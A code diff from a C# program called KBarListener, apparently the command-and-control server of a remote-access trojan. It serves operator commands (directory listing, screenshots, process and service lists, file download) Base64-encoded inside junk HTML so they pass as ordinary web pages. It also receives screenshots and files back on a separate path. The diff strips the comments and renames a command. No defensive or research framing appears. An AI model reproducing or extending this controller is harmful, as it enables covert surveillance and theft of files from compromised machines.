@@ -31,13 +31,11 @@ namespace KBarListener
                 Console.WriteLine("Windows XP SP2 or Server 2003 is required to use the HttpListener class.");
                 return;
             }
-            // URI prefixes are required,
-            // for example "http://127.0.0.1/".
           
 
-            // Create a listener.
+            
             HttpListener listener = new HttpListener();
-            // Add the prefixes.
+           
            
                 listener.Prefixes.Add("http://127.0.0.1/index/");
                 listener.Prefixes.Add("http://127.0.0.1/data/");
@@ -48,21 +46,19 @@ namespace KBarListener
             {
                 
                 bool binary_incoming = false;
-                // Note: The GetContext method blocks while waiting for a request. 
                 HttpListenerContext context = listener.GetContext();
                 HttpListenerRequest request = context.Request;
-                // Obtain a response object.
                 HttpListenerResponse response = context.Response;
-                // Construct a response.
+                
 
-                Console.WriteLine("Try: dir, cd, screen, time [good] [bad], servlist, get [path to file] or proclist");
+                Console.WriteLine("Try: dir, cd, screen, time [good] [bad], servlist, down [path to file] or proclist");
                 if (request.RawUrl == "/index/")
                 {
                     
                     Console.WriteLine("Listening...");
 
                     com = Console.ReadLine();
-                    if (com.Contains("screen") || com.Contains("get"))
+                    if (com.Contains("screen") || com.Contains("down"))
                         binary_incoming = true;
                     else
                         binary_incoming = false;
@@ -70,17 +66,17 @@ namespace KBarListener
                     
                     string responseString = "<HTML><BODY> <p>$dollar= blach blhajsdsd $var= " + Base64Encode(command) + "zzz</p></BODY></HTML>";
                     byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);
-                    // Get a response stream and write the response to it.
+                    
                     response.ContentLength64 = buffer.Length;
                     System.IO.Stream output = response.OutputStream;
                     output.Write(buffer, 0, buffer.Length);
 
-                    // You must close the output stream.
+                    
                     output.Close();
                 }
-                else //if (request.RawUrl == "/data/")
+                else
                 {
-                    if (com.Contains("screen") || com.Contains("get"))
+                    if (com.Contains("screen") || com.Contains("down"))
                         binary_incoming = true;
 
                     if (binary_incoming == false)
